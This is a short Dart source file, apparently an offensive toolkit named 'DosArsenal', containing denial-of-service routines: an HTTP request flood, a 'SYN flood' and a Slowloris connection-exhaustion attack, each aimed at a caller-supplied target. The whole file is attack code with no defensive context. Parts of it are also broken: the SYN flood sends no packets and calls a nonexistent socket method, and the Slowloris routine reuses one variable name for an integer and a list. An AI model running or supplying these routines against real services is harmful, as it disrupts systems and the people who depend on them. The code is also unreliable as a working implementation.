import 'dart:async';
import 'dart:io';
import 'dart:math';

class DosArsenal {
  /// HTTP Flood
  static Future<void> httpFlood(String url, {int connections = 100, int duration = 10}) async {
    final client = HttpClient();
    final endTime = DateTime.now().add(Duration(seconds: duration));
    
    while (DateTime.now().isBefore(endTime)) {
      for (int i = 0; i < connections; i++) {
        try {
          final request = await client.getUrl(Uri.parse(url));
          await request.close();
        } catch (_) {}
      }
      await Future.delayed(const Duration(milliseconds: 100));
    }
  }

  /// SYN Flood (requires root)
  static Future<void> synFlood(String target, int port, {int packets = 1000}) async {
    for (int i = 0; i < packets; i++) {
      try {
        final socket = await RawSocket.create();
        await socket.close();
      } catch (_) {}
    }
  }

  /// Slowloris Attack
  static Future<void> slowloris(String url, {int sockets = 200, int duration = 60}) async {
    final endTime = DateTime.now().add(Duration(seconds: duration));
    final client = HttpClient();
    final sockets = <Socket>[];
    
    for (int i = 0; i < sockets; i++) {
      try {
        final socket = await Socket.connect(url, 80, timeout: const Duration(seconds: 5));
        socket.write('GET / HTTP/1.1\r\nHost: $url\r\n');
        sockets.add(socket);
      } catch (_) {}
    }
    
    while (DateTime.now().isBefore(endTime)) {
      for (final socket in sockets) {
        try {
          socket.write('X-a: ${Random().nextInt(1000)}\r\n');
        } catch (_) {}
      }
      await Future.delayed(const Duration(seconds: 10));
    }
  }
}
